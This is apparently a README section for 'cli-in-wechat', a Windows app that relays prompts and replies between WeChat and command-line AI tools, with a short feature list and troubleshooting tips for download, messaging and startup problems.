## 🧰 What this app does

cli-in-wechat lets you run AI tools from WeChat through the official iLink Bot API. It connects common command-line AI tools with WeChat so you can send prompts and read replies in one place.

Use it to work with:

- Claude Code
- Codex
- Gemini
- Kimi
- OpenCode

This setup is made for end users who want to use these tools without switching between many apps.

## 🛠️ Troubleshooting

### App does not open

- Check that the file finished downloading
- Make sure you extracted the `.zip` file first
- Right-click the app and choose Run as administrator
- Download the file again from the release page

### WeChat does not receive messages

- Check that WeChat is open
- Confirm the bot API key is correct
- Make sure the app is still running
- Send a short test message first

### AI replies do not show up

- Check the selected model name
- Confirm your API access is active
- Look for any error text in the app window
- Restart the app and try again

### The app closes right away

- Run it again as administrator
- Check your antivirus quarantine folder
- Download the latest release from the page above
- Make sure your Windows version is supported
